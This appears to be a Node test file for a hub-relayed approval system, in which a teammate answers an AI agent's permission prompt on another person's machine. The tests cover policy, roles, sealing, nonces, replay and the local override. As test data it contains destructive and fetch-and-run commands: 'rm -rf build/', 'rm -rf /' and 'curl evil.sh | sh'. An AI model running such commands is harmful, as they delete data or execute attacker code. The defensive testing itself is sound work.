// Cross-machine approval cards (D-NEXT-W2-8): a teammate's Editor answers an
// agent's permission prompt. Adversarial on purpose — an answer authorises a
// tool call on ANOTHER person's machine — so each rule is pinned from both
// ends: the hub (policy, role, first answer wins, ciphertext only) and the
// executing side (exact action, once, local wins, outcome unknown).
import { test, describe, after } from "node:test";
import assert from "node:assert/strict";
import { createRequire } from "node:module";
import { mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { randomUUID } from "node:crypto";
import { startHub } from "./helpers.mjs";
import { Accounts } from "../hub/accounts.mjs";
import { deriveDocKey } from "../client/secret.mjs";
import * as docCrypto from "../client/doc-crypto.mjs";

const require = createRequire(import.meta.url);
const ap = require("../desktop/agent-approval.js");

const KEY = deriveDocKey("ab".repeat(24));
const CMD = "rm -rf build/";

const hubs = [];
const streams = [];
after(async () => {
  for (const s of streams) s.close();
  await Promise.all(hubs.map((h) => h.stop()));
});

async function team(env = {}) {
  const dir = mkdtempSync(path.join(tmpdir(), "zevet-approve-"));
  const file = path.join(dir, "accounts.json");
  const seed = new Accounts({ file });
  const andrew = seed.signIn({ login: "AndrewDoft", id: "1001" }).token; // owner
  seed.allow("bob");
  const bob = seed.signIn({ login: "bob", id: "2002" }).token;
  seed.allow("mallory");
  const mallory = seed.signIn({ login: "mallory", id: "3003" }).token;
  const hub = await startHub({ ZEVET_ACCOUNTS: file, ...env });
  hubs.push(hub);
  return { hub, file, andrew, bob, mallory };
}

async function channel(base, token) {
  const ctl = new AbortController();
  const frames = [];
  const res = await fetch(`${base}/events?steer=1`, { headers: { "x-zevet-token": token }, signal: ctl.signal });
  assert.equal(res.status, 200);
  const reader = res.body.getReader();
  const dec = new TextDecoder();
  let buf = "";
  (async () => {
    try {
      for (;;) {
        const { value, done } = await reader.read();
        if (done) return;
        buf += dec.decode(value, { stream: true });
        let cut;
        while ((cut = buf.indexOf("\n\n")) >= 0) {
          const f = buf.slice(0, cut);
          buf = buf.slice(cut + 2);
          const e = /^event:\s*(.+)$/m.exec(f);
          const d = /^data:\s*(.+)$/m.exec(f);
          if (e && d) frames.push({ name: e[1].trim(), data: JSON.parse(d[1]), raw: d[1] });
        }
      }
    } catch {
      /* closed */
    }
  })();
  const s = { frames, close: () => ctl.abort() };
  streams.push(s);
  await waitFor(() => frames.some((f) => f.name === "hello"));
  return s;
}

async function waitFor(fn, ms = 3000) {
  const end = Date.now() + ms;
  while (!fn()) {
    if (Date.now() > end) throw new Error("timed out waiting");
    await new Promise((r) => setTimeout(r, 15));
  }
}
const settle = () => new Promise((r) => setTimeout(r, 200));

const j = (base, token, route, body, method = "POST") =>
  fetch(`${base}${route}`, { method, headers: { "content-type": "application/json", "x-zevet-token": token }, body: body === undefined ? undefined : JSON.stringify(body) });

const setPolicy = (hub, andrew, approve) => j(hub.base, andrew, "/api/policy", { approve }, "PUT");

/** The card bob's desktop would publish for `Bash {command}`. */
function card(tool = "Bash", args = { command: CMD }, id = randomUUID(), session = "run-1") {
  const hash = ap.actionHash(tool, args);
  const nonce = "n".repeat(8) + id.slice(0, 8);
  const sealed = ap.sealCard(docCrypto, KEY, { id, session }, { tool, arguments: JSON.stringify(args), hash, nonce, agent: "claude", repo: "zevet" });
  return { id, session, hash, nonce, sealed, tool, args };
}

const openBody = (c) => ({ id: c.id, session: c.session, repo: "zevet", sealed: c.sealed });

/** The sealed answer a teammate's desktop sends for `c`. */
function answer(c, decision = "allow", over = {}) {
  const sealed = ap.sealAnswer(docCrypto, KEY, { id: c.id, session: c.session, hash: c.hash }, { nonce: c.nonce, hash: c.hash, decision, ...over });
  return { id: c.id, decision, sealed };
}

describe("approval cards through the hub", () => {
  test("policy defaults to off and a remote answer is refused, before and after it is turned on then off", async () => {
    const { hub, andrew, bob, mallory } = await team();
    const pol = await (await j(hub.base, bob, "/api/policy", undefined, "GET")).json();
    assert.equal(pol.policy.approve, "off");
    const c = card();
    const opened = await j(hub.base, bob, "/api/approval/open", openBody(c));
    assert.equal(opened.status, 403);
    assert.equal((await opened.json()).status, "refused-by-policy");
    assert.equal((await j(hub.base, mallory, "/api/approval/answer", answer(c))).status, 403, "off: even a stranger id is refused for policy first");

    assert.equal((await setPolicy(hub, andrew, "on")).status, 200);
    await channel(hub.base, bob);
    assert.equal((await j(hub.base, bob, "/api/approval/open", openBody(c))).status, 200);
    assert.equal((await setPolicy(hub, andrew, "off")).status, 200);
    const late = await j(hub.base, mallory, "/api/approval/answer", answer(c));
    assert.equal(late.status, 403, "turning the policy off bites an already-open card");
    assert.equal((await late.json()).status, "refused-by-policy");
  });

  test("a Viewer or a Commenter is refused; an Editor is not", async () => {
    const { hub, andrew, bob, mallory } = await team();
    await setPolicy(hub, andrew, "on");
    await channel(hub.base, bob);
    const c = card();
    await j(hub.base, bob, "/api/approval/open", openBody(c));
    for (const role of ["viewer", "commenter"]) {
      assert.equal((await j(hub.base, andrew, "/auth/role", { login: "mallory", role })).status, 200);
      const r = await j(hub.base, mallory, "/api/approval/answer", answer(c));
      assert.equal(r.status, 403, role);
      assert.match((await r.json()).error, /editor role required/);
    }
    await j(hub.base, andrew, "/auth/role", { login: "mallory", role: "editor" });
    assert.equal((await j(hub.base, mallory, "/api/approval/answer", answer(c))).status, 200);
  });

  test("the first valid answer wins; later ones are told who won and what", async () => {
    const { hub, andrew, bob, mallory } = await team();
    await setPolicy(hub, andrew, "on");
    const bobCh = await channel(hub.base, bob);
    const malCh = await channel(hub.base, mallory);
    const c = card();
    await j(hub.base, bob, "/api/approval/open", openBody(c));
    await waitFor(() => malCh.frames.some((f) => f.name === "approval" && f.data.status === "open"));

    const first = await j(hub.base, mallory, "/api/approval/answer", answer(c, "allow"));
    assert.equal(first.status, 200);
    const second = await j(hub.base, andrew, "/api/approval/answer", answer(c, "deny"));
    assert.equal(second.status, 409);
    const lost = await second.json();
    assert.equal(lost.status, "answered");
    assert.equal(lost.by, "mallory");
    assert.match(lost.error, /already answered by mallory/);

    await waitFor(() => bobCh.frames.some((f) => f.name === "approval-answer"));
    const relayed = bobCh.frames.filter((f) => f.name === "approval-answer");
    assert.equal(relayed.length, 1, "exactly one answer reaches the executing machine");
    assert.equal(relayed[0].data.by, "mallory");
    assert.equal(relayed[0].data.decision, "allow");
    assert.equal(relayed[0].data.confirm, false, "policy on: applied without the owner's click");
    // Everyone is shown the same status.
    await waitFor(() => malCh.frames.some((f) => f.name === "approval" && f.data.status === "answered" && f.data.by === "mallory"));
  });

  test("the hub relays ciphertext: the tool and its arguments never appear in a frame", async () => {
    const { hub, andrew, bob, mallory } = await team();
    await setPolicy(hub, andrew, "ask");
    const malCh = await channel(hub.base, mallory);
    const bobCh = await channel(hub.base, bob);
    const c = card();
    await j(hub.base, bob, "/api/approval/open", openBody(c));
    await j(hub.base, mallory, "/api/approval/answer", answer(c));
    await waitFor(() => bobCh.frames.some((f) => f.name === "approval-answer"));
    for (const f of [...malCh.frames, ...bobCh.frames]) {
      assert.equal(f.raw.includes("rm -rf"), false, `${f.name} leaked the command`);
      assert.equal(f.raw.includes(c.nonce), false, `${f.name} leaked the nonce`);
    }
    assert.equal(bobCh.frames.find((f) => f.name === "approval-answer").data.confirm, true, "policy ask: the owner still clicks");
  });

  test("a card is for its owner's own agent: no self-answer, and only the owner reports on it", async () => {
    const { hub, andrew, bob, mallory } = await team();
    await setPolicy(hub, andrew, "on");
    await channel(hub.base, bob);
    const c = card();
    await j(hub.base, bob, "/api/approval/open", openBody(c));
    assert.equal((await j(hub.base, bob, "/api/approval/answer", answer(c))).status, 400);
    assert.equal((await j(hub.base, mallory, "/api/approval/status", { id: c.id, status: "approved", via: "local" })).status, 403);
  });

  test("an answer the executing side rejects re-opens the card for the next valid one", async () => {
    const { hub, andrew, bob, mallory } = await team();
    await setPolicy(hub, andrew, "on");
    await channel(hub.base, bob);
    const c = card();
    await j(hub.base, bob, "/api/approval/open", openBody(c));
    assert.equal((await j(hub.base, mallory, "/api/approval/answer", answer(c))).status, 200);
    assert.equal((await j(hub.base, bob, "/api/approval/status", { id: c.id, status: "invalid", reason: "different action" })).status, 200);
    assert.equal((await j(hub.base, andrew, "/api/approval/answer", answer(c))).status, 200, "the slot was not burned");
  });

  test("expired is shown, and nothing can answer an expired card", async () => {
    const { hub, andrew, bob, mallory } = await team({ ZEVET_APPROVAL_TTL_MS: "300" });
    await setPolicy(hub, andrew, "on");
    await channel(hub.base, bob);
    const c = card();
    await j(hub.base, bob, "/api/approval/open", openBody(c));
    await new Promise((r) => setTimeout(r, 500));
    const r = await j(hub.base, mallory, "/api/approval/answer", answer(c));
    assert.equal(r.status, 409);
    assert.equal((await r.json()).status, "expired");
    const late = await channel(hub.base, andrew);
    await waitFor(() => late.frames.some((f) => f.name === "approval" && f.data.id === c.id && f.data.status === "expired"));
  });

  test("outcome unknown: the executing app goes away after an answer was relayed", async () => {
    const { hub, andrew, bob, mallory } = await team();
    await setPolicy(hub, andrew, "on");
    const bobCh = await channel(hub.base, bob);
    const watcher = await channel(hub.base, andrew);
    const c = card();
    await j(hub.base, bob, "/api/approval/open", openBody(c));
    await j(hub.base, mallory, "/api/approval/answer", answer(c));
    await waitFor(() => bobCh.frames.some((f) => f.name === "approval-answer"));
    bobCh.close(); // the app dies before it can report what it did
    await waitFor(() => watcher.frames.some((f) => f.name === "approval" && f.data.id === c.id && f.data.status === "unknown"));
  });

  test("the owner's own local answer settles it even over a relayed remote one", async () => {
    const { hub, andrew, bob, mallory } = await team();
    await setPolicy(hub, andrew, "on");
    await channel(hub.base, bob);
    const watcher = await channel(hub.base, andrew);
    const c = card();
    await j(hub.base, bob, "/api/approval/open", openBody(c));
    await j(hub.base, mallory, "/api/approval/answer", answer(c, "allow"));
    const r = await j(hub.base, bob, "/api/approval/status", { id: c.id, status: "denied", via: "local" });
    assert.equal(r.status, 200);
    await waitFor(() => watcher.frames.some((f) => f.name === "approval" && f.data.id === c.id && f.data.status === "denied" && f.data.via === "local" && f.data.by === "bob"));
    assert.equal((await j(hub.base, bob, "/api/approval/status", { id: c.id, status: "approved", via: "local" })).status, 409, "settled once");
  });
});

/** The executing side, with its hub calls recorded. */
function host({ holdMs = 40, tool = "Bash", args = { command: CMD }, id = randomUUID(), session = "run-1", inflightMs } = {}) {
  const log = { reports: [], published: [], resolved: [], advice: [] };
  const h = ap.createApprovalHost(
    {
      sealCard: (meta, c) => ap.sealCard(docCrypto, KEY, meta, c),
      openAnswer: (frame, hash, sess) => ap.openAnswer(docCrypto, KEY, { id: frame.id, session: sess, hash }, frame.sealed),
      publish: async (c) => log.published.push(c),
      report: async (rid, status, via, reason) => log.reports.push({ id: rid, status, via, reason }),
      advise: (a) => log.advice.push(a),
    },
    { holdMs, ...(inflightMs ? { inflightMs } : {}) },
  );
  h.begin({ id, tool, arguments: args, session, agent: "claude", repo: "zevet", resolve: (a) => log.resolved.push(a) });
  // What a teammate would see and echo.
  const seen = ap.openCard(docCrypto, KEY, { id, session }, log.published[0].sealed);
  const c = { id, session, hash: seen.hash, nonce: seen.nonce };
  return { h, log, c, seen };
}

const frame = (c, decision = "allow", over = {}, f = {}) => ({ ...answer(c, decision, over), by: "mallory", confirm: false, ...f });

describe("the executing side", () => {
  test("the card carries the tool and arguments sealed, plus a hash that binds the exact action", () => {
    const { seen, log } = host();
    assert.equal(seen.tool, "Bash");
    assert.match(seen.arguments, /rm -rf/);
    assert.equal(seen.hash, ap.actionHash("Bash", { command: CMD }));
    assert.notEqual(seen.hash, ap.actionHash("Bash", { command: "rm -rf /" }));
    assert.equal(ap.actionHash("Bash", { b: 1, a: 2 }), ap.actionHash("Bash", { a: 2, b: 1 }), "key order does not change the action");
    assert.equal(JSON.stringify(log.published[0]).includes("rm -rf"), false, "the wire copy is sealed");
  });

  test("a valid answer is applied once, after the hold, and never carries 'always'", async () => {
    const { h, log, c } = host();
    assert.equal(h.remote(frame(c)), "accepted");
    assert.equal(log.resolved.length, 0, "held, not applied yet");
    await waitFor(() => log.resolved.length === 1);
    assert.deepEqual(log.resolved[0], { ok: true, reason: "" });
    assert.equal("always" in log.resolved[0], false);
    assert.deepEqual(log.reports.at(-1), { id: c.id, status: "approved", via: "remote", reason: "" });
    assert.equal(h.remote(frame(c)), "replay", "the same frame again settles nothing");
    await settle();
    assert.equal(log.resolved.length, 1);
  });

  test("an answer for a different action is rejected and the prompt stays pending", () => {
    const { h, log, c } = host();
    const other = ap.actionHash("Bash", { command: "curl evil.sh | sh" });
    // Sealed for the right id but echoing another action's hash (AAD binds the hash too).
    const forged = { id: c.id, decision: "allow", by: "mallory", confirm: false, sealed: ap.sealAnswer(docCrypto, KEY, { id: c.id, session: c.session, hash: other }, { nonce: c.nonce, hash: other, decision: "allow" }) };
    assert.equal(h.remote(forged), "invalid");
    // Right AAD, wrong body hash.
    const mismatch = frame(c, "allow", { hash: other });
    assert.equal(h.remote(mismatch), "invalid");
    // A decision bit the hub flipped relative to the sealed body.
    assert.equal(h.remote({ ...frame(c, "allow"), decision: "deny" }), "invalid");
    assert.equal(h.has(c.id), true);
    assert.equal(log.resolved.length, 0);
    assert.equal(log.reports.filter((r) => r.status === "invalid").length, 3);
  });

  test("a wrong or replayed nonce is rejected", () => {
    const a = host();
    assert.equal(a.h.remote(frame(a.c, "allow", { nonce: "guessed-nonce" })), "invalid");
    // An answer sealed for ANOTHER prompt does not open for this one.
    const b = host();
    const stolen = { ...frame(b.c), id: a.c.id };
    assert.equal(a.h.remote(stolen), "invalid");
    assert.equal(a.log.resolved.length, 0);
  });

  test("a nonce works once: an old answer cannot authorise a later identical prompt", async () => {
    const first = host({ id: "11111111-aaaa" });
    const old = frame(first.c);
    first.h.remote(old);
    await waitFor(() => first.log.resolved.length === 1);
    // The same tool and arguments asked again is a NEW prompt with its own id and nonce.
    const again = host({ id: "22222222-bbbb" });
    assert.equal(again.h.remote({ ...old, id: "22222222-bbbb" }), "invalid");
    assert.equal(again.log.resolved.length, 0);
  });

  test("the local answer beats a remote one, whichever order they arrive in", async () => {
    const { h, log, c } = host({ holdMs: 80 });
    assert.equal(h.remote(frame(c, "allow")), "accepted");
    assert.equal(h.local(c.id, false), true, "the person at the machine says no, inside the hold");
    await settle();
    assert.equal(log.resolved.length, 0, "the remote allow is never applied");
    assert.deepEqual(log.reports.map((r) => [r.status, r.via]), [["denied", "local"]]);
    assert.equal(h.local(c.id, true), false, "settled once");
    // And a remote answer after a local one finds nothing to settle.
    assert.equal(h.remote(frame(c, "allow")), "replay");
  });

  test("policy ask: a remote answer is shown, never applied; the owner's click decides", async () => {
    const { h, log, c } = host({ holdMs: 10 });
    assert.equal(h.remote(frame(c, "allow", {}, { confirm: true })), "held");
    await settle();
    assert.equal(log.resolved.length, 0);
    assert.deepEqual(log.advice, [{ id: c.id, by: "mallory", decision: "allow" }]);
    assert.equal(log.reports.at(-1).status, "held");
    assert.equal(h.local(c.id, true), true);
  });

  test("a frame missing the confirm flag is treated as ask, not as permission", async () => {
    const { h, log, c } = host({ holdMs: 10 });
    const f = frame(c);
    delete f.confirm;
    assert.equal(h.remote(f), "held");
    await settle();
    assert.equal(log.resolved.length, 0);
  });

  test("outcome unknown: an approval released moments ago, then the app is interrupted", async () => {
    const { h, log, c } = host({ holdMs: 5 });
    h.remote(frame(c));
    await waitFor(() => log.resolved.length === 1);
    const out = h.interrupt("their app closed");
    assert.deepEqual(out.unknown, [c.id]);
    assert.deepEqual(log.reports.at(-1), { id: c.id, status: "unknown", via: "local", reason: "their app closed" });
  });

  test("an interruption before anyone answered is 'expired': the action never ran", () => {
    const { h, log, c } = host();
    const out = h.interrupt("lost connection");
    assert.deepEqual(out, { expired: [c.id], unknown: [] });
    assert.equal(log.reports.at(-1).status, "expired");
  });

  test("an approval from long ago is not reported unknown", async () => {
    const { h, log, c } = host({ holdMs: 5, inflightMs: 20 });
    h.remote(frame(c));
    await waitFor(() => log.resolved.length === 1);
    await new Promise((r) => setTimeout(r, 60));
    assert.deepEqual(h.interrupt().unknown, []);
  });
});
